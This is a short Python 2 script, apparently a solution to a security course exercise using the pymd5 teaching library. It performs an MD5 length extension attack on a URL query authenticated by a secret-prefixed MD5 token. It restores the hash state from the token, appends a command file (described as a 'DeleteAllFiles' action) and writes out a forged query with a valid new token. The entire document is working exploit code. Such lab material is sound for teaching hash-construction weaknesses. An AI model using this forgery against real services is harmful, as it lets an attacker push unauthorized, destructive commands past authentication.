#!/usr/bin/python

# This program will take as a command line argument a filename containing
# a valid query in the URL and modifies it such that it will execute
# a DeleteAllFiles command as the user, then output the new query to a
# specified file. Assume that the query will always begin with the token.

import sys, getopt, urllib
from pymd5 import md5, padding

def main(argv):
    # parse the command line
    # there are 3 arguments: query_file, command3_file, output_file
    query_file = ''
    command3_file = ''
    output_file = ''
    try:
        opts, args = getopt.getopt(argv, '', ["ifile=","ifile2=","ofile="])
    except getopt.GetoptError:
        print 'Error! Usage: your_script.py query_file command3_file output_file'
        sys.exit(2)
    query_file = args[0]
    command3_file = args[1]
    output_file = args[2]

    # open files and store their values
    query = open(query_file).read().strip()
    command3 = open(command3_file).read().strip()
    output = open(output_file, 'w')    

    token = query[query.index('=') + 1 : query.index('&')] # query[6:38]
    secret = '????????' # user's 8-char password; don't need to know what it is except length 
    data = query[query.index('&') + 1 :] # "user=... (rest of url)"
    hashstr = secret + data # string that was supposedly hashed to give token

    # MD5 processes messages in 512-bit blocks & pads to a multiple of 512
    # Padding = 1000.. followed by a 64-bit count of # of bits in unpadded message (hashstr)
    # If 1 & count won't fit in the current block, an additional block is added
    h = md5(state=token.decode('hex'), count=512 * ((len(hashstr) / 64) + 1))
    
    h.update(command3) # append; length extension attack!
    newtoken = h.hexdigest()
    newquery = 'token=' + newtoken + '&' + data
    newquery = newquery + urllib.quote(padding(len(hashstr)*8)) + command3
    output.write(newquery)

if __name__ == "__main__":
    main(sys.argv[1:])
